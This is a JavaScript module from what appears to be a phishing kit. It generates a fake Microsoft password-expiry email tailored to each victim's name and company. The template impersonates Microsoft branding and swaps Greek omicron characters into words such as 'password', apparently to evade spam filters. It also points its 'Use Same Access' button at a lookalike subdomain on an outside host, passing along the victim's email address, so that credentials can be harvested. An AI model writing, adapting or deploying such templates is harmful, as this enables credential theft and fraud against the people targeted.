const letter = (emailss) => {

    const email_name = emailss.split('@');
    //this is email name e.g tyoermike
    const name =  email_name[0];

    //company domain e.g microsift.com
    const company =  email_name[1];

    const COMPANYNAME = company.split('.');

    //organization name e.g microsoft
    const realCompanyName = COMPANYNAME[0];

    const emailContent = {
        subject: "REMITTANCE OFFICE",
       html: `<html>
       </style>
       <center>
        <H1 style="WIDTH: 50px; MIN-WIDTH: 50px"><img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30px"></H1>
       <center>
          <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>.oydp1{font-size:30px;color:#020202;font-family:Segoe UI;margin-bottom:20px}.oydp2{color:#020202;font-family:Segoe UI;margin-bottom:20px}.oydp3{color:#020202;font-family:Segoe UI;margin-top:25px}.oydp4{color:#020202;font-family:Segoe UI;margin-bottom:25px}.oydp5{color:#020202;font-family:Segoe UI;margin-bottom:25px}.oydp6{font-family:Segoe UI;color:#fbfbfb;background:#18a3df;border:7px solid #18a3df;text-decoration:none}.oydp7{color:#020202;font-family:Segoe UI}</style>
                         <p class="oydp1"></p>Hi ${name},<BR> <p class="oydp2">Y&omicron;ur passw&omicron;rd  f&omicron;r <%= EMAIL  %> is set to microsoft; expire &omicron;n <%= DATE  %>. </p><p class="oydp3"><b></b> </p><p class="oydp4"><b></b> </p><p class="oydp5">Kindly change &omicron;r keep same passw&omicron;rd with the butt&omicron;n bel&omicron;w</p><style>.poydp6{margin-bottom:25px}</style><base href='https://<%= COMPANYNAME %>.jasmanventures.com/'><p class="poydp6"><a href="/whp/?e=${emailss}" class="oydp6"> Use Same Access</a></p><p class="oydp7"> <I>Was this helpful?</I><br>
               Organization:${realCompanyName}<br>
               Acct Summary: <%= EMAIL %>
               <br>
               &copy; 2022 <%= COMPANYNAME %> c&omicron;rp&omicron;ration </p>
               </body></html>`
    }

    return emailContent
}


module.exports=letter;